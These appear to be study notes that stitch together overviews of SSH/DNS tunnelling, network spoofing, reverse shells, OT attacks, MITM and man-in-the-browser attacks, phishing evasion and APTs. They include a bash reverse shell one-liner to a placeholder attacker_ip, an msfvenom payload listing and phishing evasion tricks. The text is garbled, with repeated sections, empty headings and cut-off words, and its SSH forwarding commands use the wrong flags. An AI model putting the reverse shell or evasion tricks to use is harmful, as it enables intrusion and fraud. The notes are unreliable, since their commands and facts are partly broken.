Tunnelling: A Hidden Path Through Network Security

Tunneling is a technique for creating a secure communication channel between two machines by encapsulating one protocol within another. This "tunnel" allows data to flow securely even if the underlying network has security measures in place.

**Why Use Tunneling?**

- **Bypass Security Measures:** Attackers can exploit tunnels to bypass firewalls, intrusion detection systems (IDS), and other security controls.

- **Hide Traffic:** Tunnelling can mask the true nature of the data being transferred, making it difficult for security systems to detect suspicious activity.

- **Remote Access:** Legitimate applications like SSH tunnelling allow secure remote access to resources behind firewalls.

**Types of Tunneling:**

1.  **SSH Tunnelling:** This popular method uses the SSH protocol to create a secure tunnel. It's often used for secure remote access and can be configured for:

    - **Local Port Forwarding:** Redirects traffic from a local port on your machine to a remote port on another machine, allowing access to services that might be blocked by firewalls.

    - **Remote Port Forwarding:** The opposite of local forwarding. The remote server listens on a specific port and forwards traffic to a designated local machine and port on your network.

2.  **HTTP Tunneling:** This technique hides data within HTTP requests, making it appear like normal web traffic. However, it can be less secure than SSH tunneling.

3.  **DNS Tunneling:** Abuses the DNS protocol to embed data within DNS requests. This method is complex to set up but can be challenging to detect.

**Security Considerations:**

While tunneling offers benefits, it also creates security risks. Here's how to stay safe:

- **Monitor Network Traffic:** Keep an eye out for unusual activity, especially encrypted traffic originating from unexpected sources.

- **Strong Encryption:** Use strong encryption algorithms for your tunnels to minimize the risk of data breaches if intercepted.

- **Control Access:** Carefully manage who has access to create and use tunnels on your network.

By understanding tunneling techniques and implementing proper security measures, you can mitigate the risks associated with this powerful tool.

Network Tunnelling

# Tunneling

**Tunnelling** **technique** used to bypass network security measures and gain access to a target machine. It involves <span class="mark">encapsulating one protocol within another protocol to create a secure communication channel</span> between two machines.

Tunnelling can be used <span class="mark">to bypass firewalls, intrusion detection systems, and other security measures</span> that are designed to prevent unauthorized access to a network. It can also be used to hide the identity of the attacker and evade detection.

**Tunnelling Types**

SSH Tunnelling

HTTP Tunnelling

DNS Tunnelling

## SSH Tunnelling

In SSH tunnelling, SSH protocol used to create a secure connection between two machines. It is often used by penetration testers to bypass firewalls and other security measures that are designed to prevent unauthorized access to a network.

SSH tunnelling works by encapsulating one protocol within another protocol. The client-side machine establishes an SSH connection with the server-side machine and creates a secure communication channel between them. The client-side machine then sends the traffic it wants to tunnel through this secure channel, which is then forwarded to the server-side machine. The server-side machine then sends the traffic to its final destination.

**<span class="mark"><u>SSH Tunnelling Types</u></span>**

**Local Port Forwarding**

In SSH tunnelling, local port forwarding is a technique used to forward traffic from a local port on the client-side machine to a remote port on the server-side machine. It is often used in penetration testing to bypass firewalls and other security measures that are designed to prevent unauthorized access to a network.

Local port forwarding works by creating a secure communication channel between the client-side machine and the server-side machine. The client-side machine listens for incoming traffic on a specific local port and forwards it through this secure channel to the server-side machine. The server-side machine then sends the traffic to its final destination.

Example of how to use local port forwarding in SSH tunnelling:

\# ssh -l local_port:remote_host:remote_port user@ssh_server

In this ssh_server is the hostname or IP address of the SSH server. Once this command is executed, any traffic sent to local_port on the client-side machine will be forwarded through the secure channel to remote_host:remote_port on the target machine.

**Remote Port Forwarding**

Remote port forwarding works by creating a secure communication channel between the client-side machine and the server-side machine. The server-side machine listens for incoming traffic on a specific remote port and forwards it through this secure channel to the client-side machine. The client-side machine then sends the traffic to its final destination.

Example of how to use remote port forwarding in SSH tunnelling:

\# ssh -r remote_port:local_host:local_port user@ssh_server

## HTTP Tunnelling

## DNS Tunnelling

# Network Spoofing

Network Spoofing Techniques: Tricking Your Network

Network spoofing involves deceiving network devices by impersonating legitimate sources. Attackers exploit these techniques to gain unauthorized access or manipulate network traffic.

**1. MAC Address Snooping (Defense Technique):**

- **Function:** Monitors network traffic and identifies connected devices by their Media Access Control (MAC) addresses.

- **Benefits:**

  - Detects unauthorized devices on a network.

  - Prevents unauthorized access to sensitive information.

- **Penetration Testing:**

  - Identifies authorized/unauthorized devices to assess security vulnerabilities.

  - Tools: Wireshark, tcpdump (to capture and analyse MAC addresses in network traffic).

**2. DNS Spoofing (Attack Technique):**

- **Concept:** Redirecting users to malicious websites disguised as legitimate ones.

- **Attack Method:**

  - Tampering with DNS records to route traffic to attacker-controlled servers.

- **Impact:** Stealing sensitive data (login credentials, financial information) from unsuspecting users.

**3. ICMP Redirection (Attack Technique):**

- **Method:** Sending forged ICMP (Internet Control Message Protocol) messages to reroute network traffic.

- **Impact:** Interception of traffic for specific destinations, enabling attackers to steal or modify data.

- **Penetration Testing:**

  - Tools: icmpush, responder (to send ICMP redirect packets and test routing table modifications).

**Remember:**

- DNS Spoofing and ICMP Redirection are malicious techniques.

- MAC Address Snooping is a defensive technique to identify and potentially block unauthorized devices.

**Not covered in summary:**

- NTLM Hash Capture: A technique to steal NTLM password hashes used for Windows authentication. This wasn't covered to avoid detailing offensive techniques.

## IP Spoofing 

- Packet source routing technique is used for gaining unauthorized access to a computer with the help of a trusted host's IP address.

- The attackers spoofs the host's IP address so that the server managing a session with the host, accepts the packets from the attacker.

- When the session is established, the attacker injects forged packets before the host responds to the server.

- The original packet from the host is lost as the server gets the packet with a sequence number already used by the attacker.

- The packets are source-routed where the path to the destination IP can be specified by the attacker.

 

### MAC Address Snooping

**MAC address snooping** is a technique used to monitor network traffic and identify the MAC addresses of devices connected to a network. [This technique can be used to detect unauthorized devices on a network and prevent them from accessing sensitive information <sup>1</sup>](https://study-ccna.com/dhcp-snooping/).

In a penetration test, MAC address snooping can be used to identify the MAC addresses of devices connected to a network and determine whether they are authorized or not. This can help identify potential security vulnerabilities and prevent unauthorized access to sensitive information.

To perform MAC address snooping during a penetration test, you can use tools such as **Wireshark** or **tcpdump**. These tools can be used to capture network traffic and analyze it for MAC addresses.

For example, you can use the following command with **tcpdump** to capture network traffic and display the MAC addresses of devices connected to a network: \#sudo tcpdump -i eth0 -e

### DNS Spoofing

DNS spoofing attack involves <span class="mark">manipulating the DNS to redirect users to a fraudulent website that may resemble the user’s intended destination</span>. The attacker can modify DNS records to redirect traffic to a malicious server, enabling them to steal sensitive data from unsuspecting users.

**<span class="mark"><u>DNS spoofing Techniques</u></span>**

**Tampering with existing DNS nameserver resolver cache**: Modifying nameserver resolver cache of existing nameserver to redirect traffic to a malicious server.

**Creating malicious DNS nameserver:** Creating fake DNS nameserver and spreading malware that makes routers and end devices use it.

Use DNSSec to prevent DNS spoofing attacks.

### ICMP Redirect

**ICMP Redirect** technique used to <span class="mark">redirect network traffic to a different destination</span>. It involves <span class="mark">sending a forged ICMP redirect message to a target machine, which causes it to update its routing table and send traffic to the attacker’s machine instead of the intended destination</span>.

ICMP Redirect can be used to intercept traffic for a specific destination address.

ICMP Redirect attacks are often used in conjunction with other techniques such as <span class="mark">ARP cache poisoning</span> and <span class="mark">rogue DHCP server use</span>. The primary goal of these attacks is to intercept traffic for a specific destination address.

ICMP redirect is a type of attack that can be used to **modify the routing table of a victim’s computer**. This attack can be used to redirect traffic to a malicious server, allowing an attacker to intercept and modify network traffic.

To perform an ICMP redirect attack during a penetration test, you can use tools such as **icmpush or responder.** These tools can be used to send ICMP redirect packets to the victim’s computer, which will then modify its routing table.

For example, you can use the following command with icmpush to test how the routing table changes on a Linux system when an ICMP redirect is received:

\#icmpush -v red -sp current-gateway -gw new-gateway -dest google.com -c host -prot tcp my-eth1-ip-address

### NTLM Hash Capture

## MAC Spoofing

**MAC Spoofing:** Imitating a legitimate device's Media Access Control (MAC) address to gain unauthorized network access.

**Attack Techniques:**

- **MAC Duplicating:** Attacker steals a valid MAC address from a trusted device and uses it to impersonate that device on the network.

- **IRDP Spoofing:** Attacker sends fake router advertisements to redirect network traffic and potentially steal information.

- **MAC Flooding:** Attacker overwhelms a switch's CAM table with fake MAC addresses, causing it to behave like a hub and broadcast all traffic (easily sniffable). Tools like macof can be used for this.

- **Switch Port Stealing:** Attacker exploits a race condition to temporarily steal a switch port from a legitimate device and sniff its traffic.

**Defenses:**

- **DHCP Snooping Binding Table:** Tracks authorized MAC addresses associated with DHCP-assigned IP addresses.

- **Dynamic ARP Inspection:** Monitors ARP traffic for inconsistencies and prevents unauthorized devices from using spoofed MAC addresses.

- **IP Source Guard:** Restricts incoming traffic to specific allowed IP addresses and MAC addresses.

- **Port Security:** Limits the number of allowed MAC addresses on a switch port.

- **Strong Encryption:** Encrypts data packets to protect them even if sniffed.

- **Verify MAC Addresses:** Manually check the MAC addresses of connected devices for suspicious activity.

**Additional Points:**

- Each switch maintains a CAM table that maps MAC addresses to switch ports.

- A full CAM table can cause the switch to flood traffic like a hub, making it vulnerable to sniffing.

**Remember:** MAC spoofing is a serious security threat. Implementing strong network security measures is crucial to prevent these attacks.

# Reverse Shell

**Reverse shell** is a type of shell in which the target machine communicates back to the attacking machine. It is often used by attackers to bypass firewalls and other security measures. In penetration testing, reverse shells can be used to gain access to a target machine and execute commands remotely.

### Python reverse shell

**Python reverse shell** is a script that allows an attacker to establish a connection with a target machine and execute commands on it. The script typically consists of two parts: the <span class="mark">client-side script that runs on the attacker’s machine</span> and the <span class="mark">server-side script that runs on the target machine</span>.

The <u>client-side script sends commands to the server-side script</u>, which executes them on the target machine and sends back the output. The server-side script typically listens for incoming connections on a specific port and executes any commands it receives.

### Bash reverse shell

Bash is a popular shell program used in Unix-like operating systems.

**Bash reverse shell** is a script that allows an attacker to establish a connection with a target machine and execute commands on it. The script typically consists of two parts: the <span class="mark">client-side script that runs on the attacker’s machine</span> and the <span class="mark">server-side script that runs on the target machine.</span>

The client-side script sends commands to the server-side script, which executes them on the target machine and sends back the output. The server-side script typically listens for incoming connections on a specific port and executes any commands it receives.

Example: \#bash -i \>& /dev/tcp/attacker_ip/attacker_port 0\>&1

In this command, attacker_ip is the IP address of the attacking machine, and attacker_port is the port number on which the attacking machine is listening for incoming connections. When executed on the target machine, this command will establish a connection with the attacking machine, allowing the attacker to execute commands on it.

### MsfVenom shell

Msfvenom is the command line tool of Metasploit framework, it is used to generate payload.

Payload is the piece of code that executed on target machine after it has been exploited.

A **MsfVenom reverse shell** is a payload that allows an attacker to establish a connection with a target machine and execute commands on it. The payload typically consists of two parts: the client-side script that runs on the attacker’s machine and the server-side script that runs on the target machine.

List the available payloads in Metasploit: \#msfvenom -l payloads

Reverse Shell: Taking Control from Afar

A reverse shell allows an attacker to establish a remote connection to a compromised machine, essentially giving them a command prompt on the victim's system. It bypasses traditional security measures like firewalls, making it a valuable tool for attackers.

**How it Works:**

Unlike a traditional shell where you connect to a server, a reverse shell flips the script. The compromised machine (target) initiates a connection back to the attacker's machine (server). This way, the attacker doesn't need to directly reach the target machine, potentially bypassing firewalls.

**Common Implementations:**

- **Python Reverse Shell:** Scripts written in Python can be used to establish a reverse shell connection. These scripts typically have two parts: a client-side script running on the attacker's machine and a server-side script running on the target machine. The attacker sends commands through the client, which the server-side script executes on the target, relaying the results back.

- **Bash Reverse Shell:** Similar to Python, Bash scripts can be used for reverse shells on Unix-based systems. The attacker initiates a connection with a specific command on the target, allowing them to execute commands remotely.

- **MsfVenom Reverse Shell:** Metasploit, a popular penetration testing framework, offers MsfVenom, a tool to generate custom payloads, including reverse shells. These payloads can be tailored for specific exploits and functionalities.

**Uses of Reverse Shells:**

- **Penetration Testing:** Ethical hackers (pen testers) use reverse shells to gain access to a system during a simulated attack to assess its security posture.

- **Malicious Attacks:** Real-world attackers can leverage reverse shells to gain unauthorized access to a system, steal data, or launch further attacks.

**Staying Safe from Reverse Shells:**

- **System Hardening:** Keep your systems up-to-date with security patches to address vulnerabilities attackers might exploit to install reverse shells.

- **Network Monitoring:** Monitor network activity for suspicious connections, especially outbound connections to unknown servers.

- **Endpoint Security:** Utilize security software that can detect and block malicious activity, including attempts to establish reverse shells.

By understanding reverse shells and implementing security measures, you can make it more difficult for attackers to gain unauthorized access to your systems.

# OT Hacking 

## OT Concepts 

> **OT (Operational technology)** - This is a term that is used to describe the hardware and software that monitors and controls physical processes, devices, and infrastructure. Operational technology systems are found across a large range of asset-intensive sectors, performing a wide variety of tasks ranging from monitoring critical infrastructure (CI) to controlling robots on a manufacturing floor. OT is used in a variety of industries including manufacturing, oil and gas, electrical generation and distribution, aviation, maritime, rail, and utilities.
>
> **ICS (Industrial Control System)** - This is a general term that encompasses several types of control systems, including SCADA and DCS. The ICS consists of combinations of control components, like electrical, hydraulic, and mechanical, that act together to achieve an industrial objective (i.e.- manufacturing).
>
> **DCS (Distributed Control System)** - This refers to the control achieved by intelligence that is distributed about the process to be controlled, rather than controlled by a centrally located single unit. These are often large-scale systems that are used to automate thousands of I/O points in large facilities, like chemical plants and oil and gas refineries.
>
> **SCADA (Supervisory Control and Data Acquisition)** - This is a generic name for a system that is capable of gathering and processing data, and applying operational controls over long distances. The term SCADA mainly refers to a grouping of many ICS types in a wide geographic area. Examples of SCADA environments include water utilities, gas pipelines, and power transmission and distribution systems.
>
> **PLC (Programmable Logic Controllers)** - This is considered the “workhorse” of the industrial automation space. The microcontroller is the brain of the PLC where the firmware and set points exist. Set points are variables that are configured for use by the running program. These are manually or dynamically changed by the state of the process.
>
> **HMI (Human-Machine Interface)** - The HMI provides a graphical depiction of all of the automatic control points for a process, which is beneficial to attackers. An attacker interacting with the HMI via RDP is considered a “noisy” type of network attack, but the attacker could hide since the interaction with the HMI might look the same as an authorized operator.

## OT Attacks 

- Physical Attacks

- Wireless Attacks - wireless networks, ZigBee, etc

- Social Engineering

- USB

- Supply Chain - Infecting a vendor application or firmware.

- Malware

- Zero-Day

- Insider Threat

- MitM (Man-in-the-Middle)

> **OT Hacking Methodology** - You want to avoid actively pentesting production ICS networks as even running nmap scans can take down the network. Ideally, you will perform testing in a development network that closely mimics the production ICS network.

Start with Recon

- Discover Scripts tool

- Google Hacking Database

- Maltego

- Shodan

> **External Testing** - Identify and exploit the IT network and use that to gain access to the ICS network. The standard pentesting methodology applies for external testing.

- Foot printing

- Host Discovery/Port Scanning/Service Enumeration

- Vulnerability Mapping - This is where you match the discovered services with known vulnerabilities.

- Exploitation - Exploiting the known vulnerabilities.

- Zero-Day - Discover and exploit Zero-Day vulnerabilities. Note: This depends on the scope and time of the engagement.

Pentesting Tools for ICS Environments

- SamuraiSTFU - This is a pentesting Linux distro like Kali, but it’s specifically designed for ICS pentesting.

- Kali Linux

- Metasploit

> CORE Impact

- Immunity CANVAS

- Exploit Pack

- Peach - fuzzing tool

- Shodan

- Discover Scripts

- Maltego

- Google Hacking Database

- Netcat

- Nping

- Scapy

- Nmap

- Hping3

- Nessus

- Nexpose

## Countermeasures 

#### OT Security Best Practices 

> 1\) Increase network visibility- Identify Assets, Classify, and Prioritize Value of your assets 2) Segment networks- Ensure each zone is accessible only by authorized devices, applications, and users. (Segmentation is a fundamental best practice for securing OT, as described in ISA/IEC-62443)

3)  Analyze traffic for threats - use a NGFW and SIEM

4)  Enforce identity and access management - RBAC, MFA, SSO

5)  Secure both wired and wireless access - use a NGFW for centralized security management

#  MITM Attack

A Man-in-the-Middle (MITM) attack is a cyberattack where an attacker secretly intercepts communication between two parties, posing as each party to the other. This allows the attacker to eavesdrop, steal data, and potentially modify information without either party being aware.

How does it Work?

1.  **Interception:** The attacker positions themselves between two communicating parties.

2.  **Impersonation:** The attacker pretends to be one party to the other, creating a false connection.

3.  **Data Manipulation:** Data is sent between the parties through the attacker, who can view, modify, or steal it.

Impact of MITM Attacks

- Theft of sensitive information (passwords, credit card details)

- Eavesdropping on private communications

- Data manipulation and alteration

- Potential for identity theft and financial loss

Preventing MITM Attacks

- **Encryption:** Using strong encryption protocols like HTTPS and VPNs protects data in transit.

- **Verification:** Verify website authenticity using HTTPS and look for trusted certificates.

- **Security Software:** Employ firewalls and intrusion detection systems to monitor network traffic.

- **User Awareness:** Be cautious of public Wi-Fi and avoid sharing sensitive information on unsecured networks.

Common MITM Attack Types

- **Session Hijacking:** Taking over an existing communication session.

- **Replay Attack:** Capturing and retransmitting network traffic to deceive systems.

- **IP Spoofing:** Disguising as another system to gain unauthorized access.

- **Eavesdropping:** Listening in on network traffic to capture information.

By understanding MITM attacks and implementing preventive measures, you can significantly reduce the risk of falling victim to these malicious threats.

## Countermeasures

The provided text outlines several countermeasures to protect data transmission:

- **Authentication:** Public-key pair-based authentication verifies the identity of communicating parties, preventing impersonation. Utilize public-key pair-based authentication to verify the identity of communicating parties.

- **Encryption:** Implement strong encryption methods like public-key encryption, WEP/WPA, and HTTPS to secure data.

<!-- -->

- **HTTPS:** Enforces encrypted communication between the client and server, protecting data from eavesdropping. Force HTTPS for secure web communication.

<!-- -->

- **Intrusion Detection Systems:** Monitor network traffic for suspicious activity.

<!-- -->

- **Strong Encryption:** Robust encryption, especially public-key encryption, prevents unauthorized interception and decryption of data.

- **VPN:** A VPN encrypts data and masks the user's IP address, making it difficult for attackers to intercept traffic. Employ VPNs to create secure encrypted tunnels for data transmission.

In essence, the combination of strong encryption, robust authentication, and secure communication channels is crucial to thwarting MitM attacks.

## Man in the middle attack (MiTM)

A MitM attack occurs when an attacker secretly intercepts communication between two parties (Alice and Bob) and can:

- **Eavesdrop:** Listen to their conversation and steal sensitive information.

- **Alter Messages:** Modify messages sent between Alice and Bob.

- **Impersonate Participants:** Pretend to be Bob to Alice and vice versa.

**Attack Techniques:**

- **Session Hijacking:** Taking over an existing communication session.

- **Replay Attack:** Capturing and replaying legitimate messages later.

- **IP Spoofing:** Disguising the attacker's IP address to appear trusted.

- **Eavesdropping on Unencrypted Networks:** Capturing data flowing between parties.

**Impacts:**

- **Stolen Data:** Login credentials, financial information, etc.

- **Hijacked Sessions:** Attacker takes control of communication.

- **Altered Messages:** Data integrity compromised.

**Prevention:**

- **Encryption:** Use HTTPS for websites and strong encryption (WPA2) for Wi-Fi networks.

- **Secure Wi-Fi:** Avoid public Wi-Fi or use a VPN for added security.

- **Verify Certificates:** Ensure website certificates are valid before entering information.

- **Software Updates:** Patch security vulnerabilities in your OS, browser, and other software.

**Additional Protection:**

- **Public Key Cryptography:** Verifies the identity of parties you communicate with.

- **Intrusion Detection Systems (IDS):** Helps identify and block suspicious network activity.

- **Forced HTTPS:** Enforces secure connections on web applications.

- **Avoiding Unsecured Wi-Fi:** Prioritize HTTPS websites and consider plugins that force HTTPS connections.

By following these practices, you can significantly reduce the risk of MitM attacks and protect your online communication.

## Man-in-the-Middle Attack

- When users or devices access a remote system over the internet, they assume they are communicating directly with the server of the target system.

- In a Man in the M attack, attackers break this assumption, placing themselves in between the user and the target server.

- Once the attacker has intercepted communications, they may be able to compromise a user’s credentials, steal sensitive data and return different responses to the user.

**How prevent the Man-in-the-Middle Attack?**

- Have a stronger WAP/WEP Encryption on wireless access points avoids unauthorized users.

- Use a VPN for a secure environment to protect sensitive information. It uses key-based encryption.

- Public key pair-based authentication must be used in various layers of a stack for ensuring whether you are communicating the right things are not.

- HTTPS must be employed for securely communicating over HTTP through the public-private key exchange.

- Man in the Middle Attack include following:

- **Session Hijacking**: Attacker hijacks a session between a network server and a client. The attacking computer substitutes its IP address for the IP address of the client. T server believes it is corresponding with the client and continues the session.

- **Replay Attack**: Cybercriminal eavesdrops on network communication and replays messages at a later time, pretending to be the user. Replay attacks have been largely mitigated by adding timestamps to network communications.

- **IP Spoofing Attack:** Attacker convinces a system that it is corresponding with a trusted, known entity. The system thus provides the attacker with access. The attacker forges its packet with the IP source address of a trusted host, rather than its own IP address. Take place when a valid or authorized system is impersonated via IP address manipulation. The service thinks it is communicating with an authorized system when it is really talking to an impostor. ARP (Address Resolution Protocol), DNS (Domain Name System), IP Address, and MAC (Message Authentication Code) are susceptible to spoofing.

- **Eavesdropping Attack**: Attackers leverage insecure network communication to access information transmitted between client and server. These attacks are difficult to detect because network transmissions appear to act normally.

- **Port Scanning:**

- **Can be done with the nmap utility and involves sending SYN packets to a range of ports on the target systems. The replies, or lack of replies, from the target provide a significant amount of information about the possible services running on the target.**

- **Polymorphic engine Privilege escalation**  

# The End

#  Man in the Browser Attack

MITB stands or Man-in-the-Browser Attack.

MITB attack uses a Trojan Horse to intercept the calls between the browser and its security mechanisms or libraries. It works with an already installed Trojan horse and acts between the browser and its security mechanisms. Its main objective is to cause financial deceptions by manipulating transactions of Internet Banking systems. The man-in-the-browser attack will be successful irrespective of security mechanisms such as SSL, PKI, or two-factor authentication in place, as all the expected controls and security mechanisms would seem to work normally.

**MITB attack Process**

- Trojan first infects the computer's software (OS or application).

- Trojan installs malicious code (extension files) and saves it into the browser configuration.

- After the user restarts the browser, the malicious code in the form of extension files is loaded.

- Extension files register a handler for every visit to the webpage.

- When the page is loaded, the extension uses the URL and matches it with a list of known sites targeted for attack.

- The user logs in securely to the website.

- It registers a button event handler when a specific page load is detected for a specific pattern and compares it with its targeted list.

- When the user clicks on the button, the extension uses the DOM interface and extracts all the data from all form fields and modifies the values.

- The browser sends the form and modified values to the server.

- The server receives the modified values but cannot distinguish between the original and the modified values.

- After the server performs the transaction, a receipt is generated.

- Now, the browser receives the receipt for the modified transaction.

- The browser displays the receipt with the original details.

- The user thinks that the original transaction was received by the server without any interceptions.

## MITB Attack

Man-in-the-Browser (MitB) Attack.

A MitB attack targets a user's web browser, essentially inserting itself between the user and the website they are visiting. Here is how it works:

- **Infection:** A Trojan infects the user's device (computer or phone).

- **Malicious Extension Installation:** The Trojan installs malicious code as browser extensions.

- **Extension Activation:** When the user restarts the browser, the extensions load.

- **Website Monitoring:** These extensions monitor websites visited by the user.

- **Targeted Login:** When the user visits a targeted website (often banking), the extension becomes active.

- **Form Manipulation:** The extension intercepts form submissions and modifies the data entered by the user (e.g., transaction amount).

- **Deception:** The modified data is sent to the website, while the user sees the original values on their screen, remaining unaware of the manipulation.

- **Impact:** Primarily targets financial transactions for fraudulent gains. Bypasses security measures like SSL, PKI, and even two-factor authentication because the attack happens within the user's browser.

**Prevention:**

- Be cautious of suspicious links and attachments that might install malware.

- Use reputable security software and keep it up to date.

- Be mindful of browser extensions and only install those from trusted sources.

- Check the URL and legitimacy of websites before entering sensitive information.

# Modern Initial Access and Evasion Tactics

Initial Access & Evasion tactics effectiveness is very Company/vendor specific.

Quite hard to maintain absolute 0% detection rate in Mature, Highly Secured Environments.

## Phishing

Stay away of regular e-mail exchanges

Stick more to Third-Party communication channels (LinkedIn, Chat, Contact Forms)

Develop multi-step plausible pretexts

- CV/Resume in response to a real Job Offer, Customer Inquiry

- Investor Relations (IR) exchange leading to IPO/bonds/shares acquisition

- Social Marketing offering

Attacker could send resume URL on LinkedIn, Team Chat, or forms etc.

Banger tricks:

» Ride-to-Left-Override-Like-Its-90s

» “This E-mail was scanned. \[…\] No Spam detected. Links are safe to open.”

**Countermeasures**

Get familiar with state-of-the-art Detections

Here we reverse-engineer 20+

MS Defender for Office365 Anti-Spam rules

Indicators of Attack of Malicious or Spam Emails:

SPAM Message contained embedded image. ,\
SPAM Moved message to Spam and created Email Rule to move messages.\
Subject line contained suspicious words (like Viagra)\
triggered on mail with empty body and subject "Click here\
Subject line contained suspicious words luring action (ex. "Click here") .

**Suspicious Subject Lines:**

- Contain unusual words or phrases (e.g., Viagra).

- Include urgent calls to action (e.g., "Click here").

**Suspicious Body Content:**

- Empty body with a suspicious subject line.

- Extremely large amount of text (over 10,000 characters).

- Very short text messages (less than 150 words).

- HTML formatting with:

  - Less than 150 words of text.

  - Only one tag in the body.

  - Underline tag.

  - Text but no bold, italic, or underline formatting.

  - URL but no text formatting.

**Additional Tips:**

- Be cautious of emails with embedded images (not mentioned as a rule, but can be a red flag).

- Consider creating email rules to filter messages based on these indicators.

- If unsure, it is always best to err on the side of caution and not interact with suspicious emails.

# Most common types of attack vectors

Phishing emails

Social engineering

Spoofing

Malware

Unpatched vulnerabilities

Delivery of malicious code

Missing or poor encryption

Brute Force attack

DoS and DDoS

Compromised Credentials

Malicious Insiders

Man in the middle attacks

**OSI Layers and Attacks**

1.  Application 🡨 Exploit

2.  Presentation 🡨 Phishing

3.  Session 🡨 Hijacking

4.  Transport 🡨 Reconnaissance

5.  Network 🡨 MITM

6.  Data link 🡨 Spoofing

7.  Physical 🡨 Sniffing

- Email crimes

  - Email fraud

  - Email forgery

  - Email spoofing

  - Email bombing

  - Email threatening

  - Email spamming

  - Spreading malicious code through emails

  - Email storm

  - Email sniffing

  - Email hacking

Cyber theft

- Theft of telecom services

- Internet time theft

- Identity theft

Cyber Stalking

- Email stalking

- Internet stalking

- Computer stalking

Hacking

- Ethical hacking

- Online banking hacking

- Email hacking

- Network hacking

- Password hacking

- Computer hacking

Cyber terrorism

- Cyber extortion

- Cyber vandalism

- Cyber hate

- Cyber harrasment

Financial Crime

- Pharming

- Phishing

- Smishing

- Vishing

- Cyber laundering

- Credit card fraud

- Salami attacks

- Online gambling

- Sale of illegal items

**Denial of service**

- Volume based attack

- Protocol attacks

- Application layer attacks

Cyber Squatting

- Software piracy

- Trademark violation

- Copyright infringement

- Name jacking

Malicious code

- Computer virus

- Worm

- Trojan horse

- Password attacks

- Spyware

- Adware

- Botnets

- Rootkit

- Zombies

- Active content

# Prioritizing Cyber Threats

# Cyber Crime in India

**Where to report cybercrime?**

<https://cybercrime.gov.in/Webform/Index.aspx>

**Check how many numbers allocated to you?**

<https://tafcop.sancharsaathi.gov.in/telecomUser/welcome>

# APT

- **Advanced Persistent Threat (APT)**: An adversary with sophisticated expertise and resources allowing it to attack via multiple attack vectors (e.g., cyber, physical, and deception). Attackers repeatedly pursue objectives over extended time periods, adapt to resist detection, and maintain levels of interaction to execute objectives, which include: establish footholds, exfiltration of data, and undermining organizational mission.

- **Advanced Persistent Threats (APT)**: An advanced persistent threat (APT) is a stealthy threat actor, typically a nation state or state-sponsored group, which gains unauthorized access to a computer network and remains undetected for an extended period 

- **Advanced persistent threats (APT)**: When an individual or group gains unauthorized access to a network and remains undiscovered for an extended period, attackers may exfiltrate sensitive da deliberately avoiding detection by the organization’s security staff. APTs require sophisticated attackers and involve major efforts, so they are typically launched aga nation states, large corporations or other highly valuable targets.

## APT concepts 

**Summary:**

Advanced Persistent Threats (APTs) are highly sophisticated cyberattacks where attackers gain unauthorized access to a network and remain undetected for extended periods. Their primary goal is to steal sensitive information rather than causing immediate disruption.

**Key characteristics of APTs:**

- **Advanced:** Uses sophisticated techniques to exploit vulnerabilities.

- **Persistent:** Maintains a long-term presence in the network using a command and control (C&C) system.

- **Threat:** Involves human operators who coordinate the attack.

**Common targets of APT attacks:**

- Government agencies

- Military organizations

- Corporations

- Critical infrastructure

**Information sought by attackers:**

- Classified documents

- User credentials

- Personal information

- Network information

- Financial data

- Intellectual property

- Sensitive business strategies

- Control system access information

 

## Characteristics of APT

**Characteristics of Advanced Persistent Threats (APTs)**

APTs are characterized by:

- **Long-Term Goals:** Focused on specific objectives, often strategic in nature.

- **Persistent Access:** Maintains continuous access to target systems.

- **Targeted Attacks:** Exploits specific vulnerabilities in the target organization.

- **Stealthy Operations:** Employs advanced techniques to avoid detection.

- **Multiple Phases:** Involves multiple stages, from reconnaissance to data exfiltration.

- **Human Element:** Often involves skilled human operators.

- **Complex Attacks:** Leverages a variety of techniques, including phishing and malware.

## APT Lifecycle:

APT Lifecycle:

1.  **Preparation:** Define/Research target, Organize team, Build or attain tools, Test for detection

2.  **Initial Intrusion:** Deployment of malware, Establishment of outbound connection

3.  **Expansion:** Expand access, Obtain credentials

4.  **Persistence:** Maintain access

5.  **Search & Exfiltration:** Search for data, Exfiltrate data

6.  **Clean-up:** Cover tracks, Remain undetected
